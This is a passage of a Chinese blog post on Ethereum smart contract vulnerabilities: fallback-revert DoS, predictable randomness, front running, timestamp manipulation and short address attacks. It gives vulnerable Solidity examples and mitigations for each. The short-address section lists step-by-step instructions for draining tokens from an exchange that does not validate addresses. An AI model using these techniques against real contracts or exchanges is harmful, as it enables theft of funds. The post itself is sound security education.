+<p>当其他正常账户参与游戏调用becomePresident逻辑时，同样会向attach合约地址（当前president）发送price，正因为当前president不是普通账户还是合约账户，transfer会触发合约中fallback函数，而恶业攻击者在fallback中执行了revert()，导致异常，从而无法执行后续变更总统和价格的逻辑。造成合约DOS。</p>
+<h2 id="避坑技巧-1"><a href="#避坑技巧-1" class="headerlink" title="避坑技巧"></a>避坑技巧</h2><p>在第一个例子中，合约不应该在由外部用户人为操纵的数据结构中循环。可以使用withdrawal，即每个投资者都调用一个撤回函数来独立地声明代币。</p>
+<p>在上面的第二个例子中，要求特权用户更改合约状态。在这个例子中，当owner丧失能力时，可以使用故障保护装置。一个解决方案是将owner设置为一个多重签名合约。</p>
+<p>另一个解决方案是使用一个时间锁，其中需要在第13行代码中，包括一个基于时间的机制，比如</p>
+<p><code>require(msg.sender == owner || now &gt; unlockTime)</code></p>
+<p>这允许任何用户在一段时间之后最终确认，该时间由unlockTime指定。这种方法也可以用在第三个例子中。</p>
+<p>如果需要外部调用才能进入一个新状态的话，则要考虑到它们可能出现的故障，并可能增加一个基于时间的状态进程，否则所希望的调用可能永远不会出现。</p>
+<hr>
+<h1 id="top-6-Bad-Randomness"><a href="#top-6-Bad-Randomness" class="headerlink" title="top 6 Bad Randomness"></a>top 6 Bad Randomness</h1><h2 id="Info-3"><a href="#Info-3" class="headerlink" title="Info"></a>Info</h2><p>绝对的随机在Ethereum中很难实现，因为所有参数都可以在透明的链上查询，因此想要利用随机特性生成逻辑很容易出现问题。solidity中提供了一些获取随机数的方法，如果种子选取不当，很容易被预测。</p>
+<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">uint256 private seed;</span><br><span class="line"></span><br><span class="line">function play() public payable &#123;</span><br><span class="line">    require(msg.value &gt;= 1 ether);</span><br><span class="line">    iteration++;</span><br><span class="line">    uint randomNumber = uint(keccak256(seed + iteration));</span><br><span class="line">    if (randomNumber % 2 == 0) &#123;</span><br><span class="line">        msg.sender.transfer(this.balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>利用私有变量seed和iteration通过keccak256 hash计算得到随机数，虽然seed属性为private，但是它也要在某个时间点设置，可以通过链上相关tx来获取其值，因此随机性可预测。</p>
+<h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function play() public payable &#123;</span><br><span class="line">    require(msg.value &gt;= 1 ether);</span><br><span class="line">    if (block.blockhash(blockNumber) % 2 == 0) &#123;</span><br><span class="line">        msg.sender.transfer(this.balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里使用block.blockhash(blockNumber)来计算随机数，在solidity中，block.blockhash(uint blockNumber) returns (bytes32)只计算就近的256个块hash，如果blockNumber为当前块（block.number）或者超过256更久远的块，计算结果都是0。</p>
+<p>同时Solidity文档也强调尽量不要使用<strong>block.timestamp、now和block.blockhash</strong>计算随机数。</p>
+<h2 id="案例一-SmartBillions"><a href="#案例一-SmartBillions" class="headerlink" title="案例一 SmartBillions"></a>案例一 SmartBillions</h2><p><a href="https://www.reddit.com/r/ethereum/comments/74d3dc/smartbillions_lottery_contract_just_got_hacked/" target="_blank" rel="noopener">SmartBillions lottery contract just got hacked!</a></p>
+<p>这是一个赌博合约，黑客在256块后调用won（此时hash结果为0）赢得奖金。</p>
+<h2 id="案例二-theRun"><a href="#案例二-theRun" class="headerlink" title="案例二 theRun"></a>案例二 theRun</h2><p>合约中利用random(unit Max)函数进行随机数生成，而生成因子主要是利用block.timestamp和block.number，而时间戳可以由矿工操控，故矿工可以选择有利的随机数来提高获取奖励的概率。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">function Participate(uint deposit) private &#123;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    // Winning the Pot :) Condition : paying at least 1 people with deposit &gt; 2 ether and having luck !</span><br><span class="line">    if(  ( deposit &gt; 1 ether ) &amp;&amp; (deposit &gt; players[Payout_id].payout) )&#123; </span><br><span class="line">        uint roll = random(100); //take a random number between 1 &amp; 100</span><br><span class="line">        if( roll % 10 == 0 )&#123; //if lucky : Chances : 1 out of 10 ! </span><br><span class="line">            msg.sender.send(WinningPot); // Bravo !</span><br><span class="line">            WinningPot=0;</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint256 constant private salt =  block.timestamp;</span><br><span class="line"></span><br><span class="line">function random(uint Max) constant private returns (uint256 result)&#123;</span><br><span class="line">    //get the best seed for randomness</span><br><span class="line">    uint256 x = salt * 100 / Max;</span><br><span class="line">    uint256 y = salt * block.number / (salt % 5) ;</span><br><span class="line">    uint256 seed = block.number/3 + (salt % 300) + Last_Payout +y; </span><br><span class="line">    uint256 h = uint256(block.blockhash(seed)); </span><br><span class="line"></span><br><span class="line">    return uint256((h / x)) % Max + 1; //random number between 1 and Max</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="避坑技巧-2"><a href="#避坑技巧-2" class="headerlink" title="避坑技巧"></a>避坑技巧</h2><p>熵的来源必须是区块链的外部。这可以在具有诸如commit-reveal之类系统的对等体之间完成，或者通过将信任模型改变为一组参与者（例如在RandDAO中）来完成。不过区块变量不应该用做源熵，因为它们可以被矿工操纵。</p>
+<hr>
+<h1 id="top-7-Front-Running"><a href="#top-7-Front-Running" class="headerlink" title="top 7 Front Running"></a>top 7 Front Running</h1><h2 id="Info-4"><a href="#Info-4" class="headerlink" title="Info"></a>Info</h2><p>可以理解为因为区块链是公开，其他用户或者合约的交易信息均透明可查，恶意用户可以利用这些已知信息制造有利于自己的交易，并通过提高手续费的方式抢先执行获利。</p>
+<h2 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h2><h3 id="例子一，一个游戏"><a href="#例子一，一个游戏" class="headerlink" title="例子一，一个游戏"></a>例子一，一个游戏</h3><p>LastIsMe是一个lottery游戏合约，在一个游戏回合（一定的区块数内）参与者购买一张票认领最后一个座位，回合结束时最后一个就坐的玩家会获得头奖。</p>
+<p>攻击者可以在回合快结束时观察其他玩家的交易池，通过提高gas来挤掉其他玩家的交易从而获得奖金。</p>
+<h3 id="例子二，一道CTF"><a href="#例子二，一道CTF" class="headerlink" title="例子二，一道CTF"></a>例子二，一道CTF</h3><p>5个块为一回合，回合内参与者猜一个数字，回合结束时机器人会随机抛出一个数字，如果谁猜中谁就获胜。而该合约存在前置执行漏洞。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">spinLottery</span><span class="params">(uint number)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msg.sender != robotAddress) &#123;</span><br><span class="line">        playerNumber[msg.sender] = number;</span><br><span class="line">        players.push(msg.sender);</span><br><span class="line">        NewLotteryBet(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        require(block.number - lotteryBlock &gt; <span class="number">5</span>);</span><br><span class="line">        lotteryBlock = block.number;</span><br><span class="line">        <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; players.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (playerNumber[players[i]] == number) &#123;</span><br><span class="line">                desires[players[i]].active = <span class="keyword">true</span>;</span><br><span class="line">                desires[players[i]].email = <span class="string">"*Use changeEmail func to set your email.*"</span>;</span><br><span class="line">                Proposal(players[i], desires[players[i]].email);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        delete players; <span class="comment">// flushing round</span></span><br><span class="line">        NewLotteryRound(lotteryBlock);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>机器人发布的随机数明文提交到交易池，如果攻击者能够足够快的检索pending交易并找到该随机数，然后使用该随机数参与游戏，保证两笔交易在同一个块中，并提高gas在机器人发布随机数的交易之前执行，就能获胜。</p>
+<h2 id="避坑技巧-3"><a href="#避坑技巧-3" class="headerlink" title="避坑技巧"></a>避坑技巧</h2><p>有两类人可以执行这些正在运行的非法预先交易攻击：用户（他们修改交易的gasPrice）和矿工本身（他们可以按照他们认为合适的方式在一个区块中重新对交易排序）。</p>
+<p>对于第一类来说，他们的合约比第二类合约要糟糕得多，因为矿工只有在解决了一个区块时才能进行攻击，而对于任何一个专门针对某个特定区块的矿工来说，这种攻击都是不可能的实现的。</p>
+<p>我们可以将列出一些防坑措施。</p>
+<p>首先，我们可以采用在合约中创建逻辑，为gasPrice设置一个上限。这使得用户无法提高gasPrice，这可以避免因提高gasPrice获得超出上限的优先交易顺序。这种预防措施只能减少第一类攻击者（任意使用者）。</p>
+<p>在这种情况下，矿工仍然可以攻击合约，因为他们可以无论gasPrice如何，都可以随心所欲地在他们所在区块内进行交易。</p>
+<p>另外，还有另一个方法是尽可能使用commit-reveal。这种方案要求用户使用隐藏的信息（通常是哈希）发送交易。在将交易包含在一个区块之后，用户发送一个交易来显示发送的数据（显式阶段）。这种方法使得矿工和用户无法确定交易的内容，因此不能对交易进行预警。</p>
+<p>然而，这种方法不能隐藏交易的价值，智能合约允许用户发送交易，其提交的数据包括了他们愿意花费的以太币数量。然后用户可以发送任意值的交易。在这个阶段，用户可以获得交易中发送的金额与他们愿意支出金额之间的差额。</p>
+<hr>
+<h1 id="top-8-Time-Manipulation"><a href="#top-8-Time-Manipulation" class="headerlink" title="top 8 Time Manipulation"></a>top 8 Time Manipulation</h1><h2 id="Info-5"><a href="#Info-5" class="headerlink" title="Info"></a>Info</h2><p>一个合约需要用到“当前时间”，通常是通过block.timestamp或者now来实现，而这个值来源于矿工。矿工可以在区块被验证后30s内发布时间戳，从而利用这30s的时间增加自己获利概率。</p>
+<h2 id="例子-theRun"><a href="#例子-theRun" class="headerlink" title="例子 theRun"></a>例子 theRun</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一个合约需要用到“当前时间”，通常是通过block.timestamp或者now来实现，而这个值来源于矿工。矿工可以在区块被验证后30s内发布时间戳，从而利用这30s的时间增加自己获利概率。</span></span><br><span class="line">uint256 constant <span class="keyword">private</span> salt =  block.timestamp;</span><br><span class="line"></span><br><span class="line"><span class="function">function <span class="title">random</span><span class="params">(uint Max)</span> constant <span class="keyword">private</span> <span class="title">returns</span> <span class="params">(uint256 result)</span></span>&#123;</span><br><span class="line">    <span class="comment">//get the best seed for randomness</span></span><br><span class="line">    uint256 x = salt * <span class="number">100</span>/Max;</span><br><span class="line">    uint256 y = salt * block.number/(salt % <span class="number">5</span>) ;</span><br><span class="line">    uint256 seed = block.number/<span class="number">3</span> + (salt % <span class="number">300</span>) + Last_Payout + y; </span><br><span class="line">    uint256 h = uint256(block.blockhash(seed)); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> uint256((h / x)) % Max + <span class="number">1</span>; <span class="comment">//random number between 1 and Max</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>theRun合约使用block.timestamp作为随机数种子，而矿工完全可以在30s内计算一个利于获胜的随机数。</p>
+<h2 id="避坑技巧-4"><a href="#避坑技巧-4" class="headerlink" title="避坑技巧"></a>避坑技巧</h2><p>区块时间戳不应该用于熵或产生随机数，例如，它们不应成为（直接或通过某种推导）赢得一场比赛或改变一个重要的状态（如果假设是随机的）的决定性因素。</p>
+<p>有敏锐的时间逻辑有时是必要的，例如解锁合约（timelocking）在几周后完成一个 ICO 或强制执行过期日期。有时建议使用block.number和一个平均区块时间来估计时间。</p>
+<p>例如，一个星期零10秒钟的区块时间，相当于大约60480个区块生成时间。因为矿工无法轻易操纵区块序数，所以指定一个区块序数来更改合约状态可以更加安全，BAT ICO合约就采用了这一策略。</p>
+<p>如果合约不是特别关注矿工操纵的区块时间戳，也可以不用这样做，但是在开发合约时需要注意这一点。</p>
+<hr>
+<h1 id="top-9-Short-Addresses"><a href="#top-9-Short-Addresses" class="headerlink" title="top 9 Short Addresses"></a>top 9 Short Addresses</h1><h2 id="info-1"><a href="#info-1" class="headerlink" title="info"></a>info</h2><p>这个漏洞现在已经修复了，可以算之前EVM的缺陷。</p>
+<blockquote>
+<p>The Contract Application Binary Interface (ABI) is the standard way to interact with contracts in the Ethereum ecosystem, both from outside the blockchain and for contract-to-contract interaction.</p>
+</blockquote>
+<h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">contract MyToken &#123;</span><br><span class="line">    mapping (address =&gt; uint) balances;</span><br><span class="line"> </span><br><span class="line">    event Transfer(address indexed _from, address indexed _to, uint256 _value);</span><br><span class="line"> </span><br><span class="line">    function MyToken() &#123;</span><br><span class="line">        balances[tx.origin] = 10000;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function sendCoin(address to, uint amount) returns(bool sufficient) &#123;</span><br><span class="line">        if (balances[msg.sender] &lt; amount) return false;</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">        balances[to] += amount;</span><br><span class="line">        Transfer(msg.sender, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function getBalance(address addr) constant returns(uint) &#123;</span><br><span class="line">        return balances[addr];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当我们转币给其它地址时，会调用sendCoin方法。当地址to丢失末尾两位，会在value的右侧补0，造成value*256。</p>
+<h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>这个东西要这么用。</p>
+<p>1、首先生成一个ETH的靓号，这个账号末尾为2个0，使用一些跑号工具可以做到。<br>2、找一个交易所钱包，该钱包里token数量为25600，往这个钱包发送1000个币。<br>3、然后再从这个钱包中提出1000个币，这时候写地址的时候把最后两个0去掉，如果交易所并没有校验用户填入的以太坊地址，则EVM会把所有函数的参数一起打包，会把amount参数的高位1个字节吃掉。<br>4、这三个参数会被传入到msg.data中，然后调用合约的transfer方法，此时，amount由于高位的1个字节被吃掉了，因此amount = amount &lt;&lt; 8，即扩大了256倍，这样就把25600个币全部提出来了。</p>
+<h2 id="避坑技巧-5"><a href="#避坑技巧-5" class="headerlink" title="避坑技巧"></a>避坑技巧</h2><p>显而易见，在将所有输入发送到区块链之前进行验证，将会有效防止这类攻击。此外，参数排序在这里起着重要的作用。由于填充只发生在最后，智能合约中对参数的仔细排序可以防患于未然。</p>
+<hr>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/programming/">编程</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Ethereum/">Ethereum</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
   
     <article id="post-Ethereum-background" class="article article-type-post" itemscope itemprop="blogPost">
   
